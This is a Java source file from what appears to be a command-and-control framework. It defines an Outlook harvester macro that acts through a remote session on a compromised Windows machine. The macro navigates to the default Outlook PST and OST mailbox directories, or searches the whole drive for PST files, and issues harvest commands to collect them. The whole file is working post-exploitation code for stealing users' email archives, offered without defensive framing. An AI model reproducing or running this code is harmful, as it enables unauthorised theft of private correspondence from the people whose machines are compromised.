package c2.session.macro;

import java.nio.file.Path;
import java.nio.file.Paths;

import c2.Commands;
import c2.HarvestProcessor;
import c2.session.IOManager;
import c2.win.WindowsCmdLineHelper;

public class OutlookHarvesterMacro extends AbstractCommandMacro {

	public static String OUTLOOK_HARVEST_COMMAND = "harvest_outlook";
	public static String OUTLOOK_HARVEST_BASIC = "basic";
	public static String OUTLOOK_HARVEST_DEEP_SEARCH = "deep";

	public static String OUTLOOK_PST_DEFAULT_SEARCH_DIR = "C:\\";
	public static String OUTLOOK_PST_FIND_DIR_CMD = "where /r $SEARCH_DIR$ *.pst";

	public static String OUTLOOK_OST_DIR = "%APPDATA%\\Local\\Microsoft\\Outlook";
	public static String OUTLOOK_OST_WITH_APPDATA_ROAMING_DIR = "%APPDATA%\\..\\Local\\Microsoft\\Outlook";
	public static String OUTLOOK_PST_DIR = "%USERPROFILE%\\Documents\\Outlook Files";
	public static String OUTLOOK_PST_ONEDRIVE_DIR = "%USERPROFILE%\\OneDrive\\Documents\\Outlook Files";

	private HarvestProcessor harvestProcessor;
	private IOManager io;

	@Override
	public boolean isCommandMatch(String cmd) {
		return cmd.startsWith(OUTLOOK_HARVEST_COMMAND);
	}

	@Override
	public void initialize(IOManager io, HarvestProcessor harvestProcessor) {
		this.io = io;
		this.harvestProcessor = harvestProcessor;
	}

	@Override
	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
		MacroOutcome outcome = new MacroOutcome();
		String[] elements = cmd.split(" ");
		if (elements.length >= 2) {
			if (elements[1].equals(OUTLOOK_HARVEST_BASIC)) {
				if (elements.length != 2) {
					outcome.addMacroMessage(
							OUTLOOK_HARVEST_BASIC + " option takes no arguments, ignoring additional input");
				}
				String appdata = "";
				String userProfile = "";
				try {
					appdata = WindowsCmdLineHelper.resolveAppData(io, sessionId);
					outcome.addMacroMessage("Resolved APPDATA: " + appdata);
					userProfile = WindowsCmdLineHelper.resolveVariableDirectory(io, sessionId, "%USERPROFILE%");
					outcome.addMacroMessage("Resolved USERPROFILE: " + userProfile);
				} catch (Exception e) {
					outcome.addError("Cannot resolve APPDATA and USERPROFILE");
					return outcome;
				}
				io.sendCommand(sessionId, Commands.PWD);
				outcome.addSentCommand(Commands.PWD);
				String response = io.awaitMultilineCommands(sessionId);
				if (!response.equals("")) {
					outcome.addResponseIo(response);
					outcome.addMacroMessage("Saving original working directory, proceeding with Outlook harvest");
					String originalDirectory = response.replace(System.lineSeparator(), "");
					String expectedPSTDir = OUTLOOK_PST_DIR.replace("%USERPROFILE%", userProfile);
					outcome.addSentCommand(Commands.CD + " " + expectedPSTDir);
					io.sendCommand(sessionId, Commands.CD + " " + expectedPSTDir);
					response = io.awaitMultilineCommands(sessionId);
					outcome.addResponseIo(response);
					response = response.replace(System.lineSeparator(), "");
					boolean foundPSTDir = false;
					if (!response.equals(expectedPSTDir)) {
						outcome.addMacroMessage("Attempting OneDrive dir");
						expectedPSTDir = OUTLOOK_PST_ONEDRIVE_DIR.replace("%USERPROFILE%", userProfile);
						outcome.addSentCommand(Commands.CD + " " + expectedPSTDir);
						io.sendCommand(sessionId, Commands.CD + " " + expectedPSTDir);
						response = io.awaitMultilineCommands(sessionId);
						outcome.addResponseIo(response);
						response = response.replace(System.lineSeparator(), "");
						if (!response.equals(expectedPSTDir)) {
							outcome.addError("Unable to switch to OST default directory for harvest");
						} else {
							foundPSTDir = true;
						}
					} else {
						foundPSTDir = true;
					}

					if (foundPSTDir) {
						io.sendCommand(sessionId, Commands.HARVEST_CURRENT_DIRECTORY);
						outcome.addSentCommand(Commands.HARVEST_CURRENT_DIRECTORY);
						response = io.awaitMultilineCommands(sessionId);
						outcome.addResponseIo(response);
					}

					String expectedOSTDir;
					if (appdata.contains("Roaming")) {
						expectedOSTDir = OUTLOOK_OST_WITH_APPDATA_ROAMING_DIR.replace("%APPDATA%", appdata);
					} else {
						expectedOSTDir = OUTLOOK_OST_DIR.replace("%APPDATA%", appdata);
					}
					outcome.addSentCommand(Commands.CD + " " + expectedOSTDir);
					io.sendCommand(sessionId, Commands.CD + " " + expectedOSTDir);
					response = io.awaitMultilineCommands(sessionId);
					if (response.contains("Harvest complete: ")) {
						outcome.addResponseIo(response);
						response = io.awaitMultilineCommands(sessionId);
					}
					outcome.addResponseIo(response);
					response = response.replace(System.lineSeparator(), "");
					if (response.contains("Invalid directory traversal")) {
						outcome.addError("Unable to switch to OST default directory for harvest");
					} else {
						io.sendCommand(sessionId, Commands.HARVEST_CURRENT_DIRECTORY);
						outcome.addSentCommand(Commands.HARVEST_CURRENT_DIRECTORY);
						response = io.awaitMultilineCommands(sessionId);
						outcome.addResponseIo(response);
					}

					outcome.addSentCommand(Commands.CD + " " + originalDirectory);
					io.sendCommand(sessionId, Commands.CD + " " + originalDirectory);
					if (response.contains("Harvest complete: ")) {
						outcome.addResponseIo(response);
						response = io.awaitMultilineCommands(sessionId);
					}
					response = io.awaitMultilineCommands(sessionId);
					outcome.addResponseIo(response);
					response = response.replace(System.lineSeparator(), "");
					if (!response.equals(originalDirectory)) {
						outcome.addError("Unable to restore original working directory");
					} else {
						outcome.addMacroMessage(
								"Original working directory resumed, harvest underway in the background if directories found");
					}
				} else {
					outcome.addError("Could not query for current working directory, aborting macro");
				}
			} else if (elements[1].equals(OUTLOOK_HARVEST_DEEP_SEARCH)) {
				io.sendCommand(sessionId, Commands.PWD);
				outcome.addSentCommand(Commands.PWD);
				String response = io.awaitMultilineCommands(sessionId);
				if (!response.equals("")) {
					outcome.addResponseIo(response);
					outcome.addMacroMessage("Saving original working directory, proceeding with Outlook harvest");
					String originalDirectory = response.replace(System.lineSeparator(), "");
					String findCmd = OUTLOOK_PST_FIND_DIR_CMD;
					if (elements.length == 3) {
						findCmd = findCmd.replace("$SEARCH_DIR$", elements[2]);
					} else {
						findCmd = findCmd.replace("$SEARCH_DIR$", OUTLOOK_PST_DEFAULT_SEARCH_DIR);
					}
					io.sendCommand(sessionId, findCmd);
					outcome.addSentCommand(findCmd);
					response = io.awaitMultilineCommands(sessionId, 30000);
					if (!response.contains("Attempting search with 10 minute timeout")) {
						outcome.addMacroMessage("Could not search for PST files");
					} else {
						if (!response.contains("Search complete")) {
							response = io.awaitMultilineCommands(sessionId, 120000);
						}
						if (!response.equals("") && !response.contains("Search complete with no findings")
								&& !response.contains("Cannot execute command ")) {
							outcome.addResponseIo(response);
							for (String line : response.split(System.lineSeparator())) {
								if (!line.equals("Attempting search with 10 minute timeout")
										&& !line.equals("Search complete") && !line.equals("")) {// Discard final line
																									// feed flush at end
									Path parent = Paths.get(line).getParent();
									io.sendCommand(sessionId, Commands.CD + " " + parent.toAbsolutePath().toString());
									outcome.addSentCommand(Commands.CD + " " + parent.toAbsolutePath().toString());
									response = io.awaitMultilineCommands(sessionId);
									response = response.replace(System.lineSeparator(), "");
									outcome.addResponseIo(response);
									if (!response.equals(parent.toAbsolutePath().toString())) {
										outcome.addError("Unable to switch to PST found directory for harvest");
									} else {
										io.sendCommand(sessionId, Commands.HARVEST_CURRENT_DIRECTORY);
										outcome.addSentCommand(Commands.HARVEST_CURRENT_DIRECTORY);
										response = io.awaitMultilineCommands(sessionId);
										outcome.addResponseIo(response);
									}
								}
							}
						} else {
							outcome.addMacroMessage("No PST files found.");
						}
					}

					io.sendCommand(sessionId, Commands.CD + " " + originalDirectory);
					outcome.addSentCommand(Commands.CD + " " + originalDirectory);
					response = io.awaitMultilineCommands(sessionId);
					response = response.replace(System.lineSeparator(), "");
					outcome.addResponseIo(response);
					if (!response.equals(originalDirectory)) {
						outcome.addError("Unable to switch to original directory for harvest");
					} else {
						outcome.addMacroMessage(
								"Original working directory resumed, harvest underway in the background if directories found");
					}
				}

			} else {
				outcome.addError("Improper argument of command: " + OUTLOOK_HARVEST_COMMAND
						+ " 'basic' for harvesting default directories or 'deep' for searching for non-traditional PST file locations");
			}
		} else {
			outcome.addError(
					"Improper format of command: " + OUTLOOK_HARVEST_COMMAND + " - at least one argument required");
		}
		return outcome;
	}

}
